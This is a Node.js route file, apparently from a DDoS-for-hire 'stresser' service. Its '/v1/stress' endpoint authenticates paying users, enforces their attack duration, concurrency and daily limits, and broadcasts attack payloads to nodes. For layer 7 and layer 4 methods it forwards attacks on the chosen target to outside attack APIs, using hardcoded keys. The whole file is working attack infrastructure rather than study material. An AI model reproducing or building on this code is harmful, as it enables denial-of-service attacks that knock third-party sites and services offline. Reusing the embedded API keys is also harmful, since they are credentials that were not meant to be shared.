const formulatePayload = require('../../functions/formulatePayload')

const userSchema = require('../../models/user')
const ongoingSchema = require('../../models/ongoing')
const logsSchema = require('../../models/logs')
const methodSchema = require('../../models/methods')

const yup = require('yup');
const axios = require('axios');

const generateString = require('../../functions/generateString')

const schema = yup.object().shape({
	host: yup.string().min(1).max(254).required(),
	port: yup.number().positive().max(65535),
	time: yup.number().positive().required(),
	method: yup.string().required(),
	proxy : yup.number(),
	key: yup.string().length(18).required()
});

module.exports = (app, socket, broadcast) => {
	app.get('/v1/stress', async (req, res, next) => {
		let {
			host,
			port,
			time,
			method,
			proxy,
			key
		} = req.query;
		try {
			await schema.validate({
				host,
				port,
				time,
				method,
				proxy,
				key
			})
			console.log(`key=${key} and time=${time}`);			
			const userFound = await userSchema.findOne({
				api_key: key
			})
			if(!userFound)
				return next(new Error('Incorrect API key.'))
			if(!userFound.api_access)
				return next(new Error('API access denied.'))

			if(time > userFound.maxTime)
				return next(new Error('Maximum time limit exceeded.'))

			const methodFound = await methodSchema.findOne( { title : method } )
			if(!methodFound)
				return next(new Error('Invalid method.'))

			const currentConcurrent = await ongoingSchema.countDocuments({
				user : userFound.username,
				stopped : false
			})
			if (currentConcurrent >= userFound.concurrent)
				return next(new Error('Concurrent limit exceeded.'))

			// Check Total Boots of Today
			var start = new Date();
			start.setHours(0,0,0,0);

			var end = new Date();
			end.setHours(23,59,59,999);

			const currentBoots = await ongoingSchema.countDocuments({
				user : userFound.username,
				time : { 
					$gte: start, 
					$lt: end
				}
			})
			if(currentBoots >= userFound.maxBoots) 
				return next(new Error('Maximum Boots limit exceeded.'))
			
			const data = {
				host,
				port,
				time,
				proxy
			}
			let payload = formulatePayload(methodFound.program, methodFound.args, data)
			payload = payload.replace(/([;:<>|"'&?=$`\\])/g,'\\$1')

			const sesId = generateString(32)
			const socketPayload = {
				session : sesId,
				type : 'attack',
				payload,
				time: time,
				nodes : methodFound.nodes
			}

			broadcast(socketPayload)
			const logAdded = new logsSchema()
			logAdded.id = generateString(32)
			logAdded.user = userFound.username
			logAdded.destination = host 
			logAdded.port = port
			logAdded.method = methodFound.title 
			logAdded.duration = time
			await logAdded.save()

			const ongoingAdded = new ongoingSchema()
			ongoingAdded.id = sesId
			ongoingAdded.user = userFound.username
			ongoingAdded.destination = host 
			ongoingAdded.method = methodFound.title 
			ongoingAdded.port = port
			ongoingAdded.duration = time
			ongoingAdded.stopped = false
			ongoingAdded.nodes = methodFound.nodes
			ongoingAdded.time = new Date()
			await ongoingAdded.save()

		 	res.send({
		 		success : true,
		 		message : 'Attack is successful.'
		 	})

		 	let timeOutduration = time * 1000
		 	
		 	// LAYER 7 API CALL
		 	if(methodFound.layer === 7 || methodFound.layer === 70) {
				try {
					axios.get('https://darlingapi.com/', {
						params: {
							key: '3926b1330990342e05f9f1b9-6d5001ea',
							target: host,
							port: port ? port : 80,
							duration: time,
							method: 'BROWSER'
						}
					})
				} catch (err) {
					console.log('51.79.249.191:2052 API error')
				}
				try {
					axios.get('https://stopbots.net/l7_secret_folder_123', {
						params: {
							key: 'gerrgtyowtfmayowtfman2yowtfman2yowtfman2n2rtghrt',
							target: host,
							port: port ? port : 80,
							time: time,
							method: 'cf',
							servers: 'bvultr'
						}
					})
				} catch (err) {
					console.log('Stopbots.net API error')
				}
		 	}
		 	// LAYER 4 API CALLS
			if(userFound.subbed && methodFound.layer === 4) {
				try {
					axios.get('https://darlingapi.com/?', {
						params: {
							key: '3b3ef3095c332dd3762f1908-2ce7e6ee',
							host: host,
							port: port ? port : 80,
							time: userFound.admin ? time : 2100,
							method: methodFound.title
						}
					})
				} catch (err) {
					console.log('darlingapi.com API error')
				}
				
			}



		 	setTimeout( async () => {
		 		const stopPayload = {
					session : sesId,
					type : 'stop',
					nodes : methodFound.nodes
				}

				broadcast(stopPayload)
				ongoingAdded.stopped = true
				await ongoingAdded.save()
		 	}, timeOutduration + 500)

		} catch (err)
		{
			return next(err)
		}
	})
}
